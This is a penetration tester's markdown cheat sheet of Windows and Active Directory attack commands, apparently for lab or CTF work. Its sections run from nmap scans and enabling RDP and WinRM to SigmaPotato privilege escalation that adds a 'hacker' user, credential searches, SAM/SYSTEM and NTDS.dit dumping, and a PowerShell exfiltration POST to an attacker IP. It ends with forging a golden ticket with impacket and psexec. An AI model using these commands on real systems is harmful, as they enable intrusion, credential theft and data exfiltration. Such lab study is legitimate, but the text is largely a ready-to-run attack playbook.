### NMAP
```bash
nmap -sCV -p U:53,161,T:- -oA scanme --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl -p- U:53,161 --reason --max-retries=1 --max-rtt-timeout=500ms --scan-delay 0 --min-rate 5500 -iL ./hosts -vvv

nmap -sCV -p U:53,161,T:- -oA scanme --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl -p- --reason -iL ./hosts -vvv
```
### Sed
```bash
sed -i 's/<search regex>/<replacement>/g' <input file>
```
### Powershell:
```powershell
Enable RPD via powerhell:
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1

CMD:
reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

Add user to group:
.\SigmaPotato.exe 'net localgroup \"Remote Desktop Users\" hacker /add'
```
### WINRM:
```powershell
enable winrm via powershell:
Enable-PSRemoting -Force

Add user to WINRM:
.\SigmaPotato.exe 'net localgroup \"Remote Management Users\" hacker /add'
```

Find programs installed:
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Find flags:
```powershell
Get-Childitem -Path C:\users -Include local.txt -Force -File -Recurse -ErrorAction SilentlyContinue | cat
Get-Childitem -Path C:\users -Include proof.txt -Force -File -Recurse -ErrorAction SilentlyContinue | cat
Get-Childitem -Path C:\users -Include *.txt -Force -File -Recurse -ErrorAction SilentlyContinue
```

Powershell history files:
```powershell
C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Get-Childitem -Path C:\users -Include ConsoleHost_history.txt -Force -File -Recurse -ErrorAction SilentlyContinue | type

FILES:
dir -Force -Recurse -File -ErrorAction SilentlyContinue | Where-Object {$_.Name -like '*.bat'-or $_.Name -like '*.cmd' -or $_.Name -like '*.kdb*'}

STRINGS IN FILES:
dir -Force -Recurse -File -ErrorAction SilentlyContinue | Where-Object {$_.Name -like '*.txt' -or $_.Name -like '*.xml' -or $_.Name -like '*.bat' -or $_.Name -like '*.conf' -or $_.Name -like '*.cmd' -or $_.Name -like '*.cnf' -or $_.Name -like '*.kdb*'} | Select-String -pattern 'password', '@relia.com' -SimpleMatch | Select pattern, LineNumber, FileName, Path
```

Get SAM/SYSTEM dump:
```powershell
reg save hklm\system system
reg save hklm\sam sam
```

Transfer files via powershell / nc:
```powershell
ATTACKER:
nc -l -p 443 > file.b64

VICTIM:
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<FULL FILE PATH TO SEND>' -Encoding Byte)); Invoke-WebRequest -Uri http://<ATTACKER IP>:443 -Method POST -DisableKeepAlive -Timeout 15 -Body $b64;

ATTACKER (AFTER RECEIVING):
cat file.b64 | sed -n '8,$'p | base64 -d > <Original file>
```

copy NTDS with backup operator priv:
```powershell
mkdir C:\temp
cd C:\temp
echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
echo "create" | out-file ./diskshadow.txt -encoding ascii -append        
echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append

diskshadow.exe /s c:\temp\diskshadow.txt
cd z:\windows\ntds
robocopy /b .\ C:\temp NTDS.dit

https://juggernaut-sec.com/hackthebox-blackfield/
```

DCSYNC:
```bash
aesKey = user krbtgt
domain-sid = current domain (whoami /user)
domain = current domain
extra-sid = target domain sid

impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 \
-domain-sid S-1-5-21-4168247447-1722543658-2110108262 \
-domain sub.poseidon.yzx \
-extra-sid S-1-5-21-1190331060-1711709193-932631991-519 \
administrator -extra-pac

export KRB5CCNAME=administrator.ccache

impacket-psexec 'sub.poseidon.yzx/Administrator@dc01.poseidon.yzx' -k -no-pass

(May have to add domain to /etc/hosts)
```

extract encrypted zip:
```
password="<password>"; 7z.exe x -p$password "archive.7z"
```
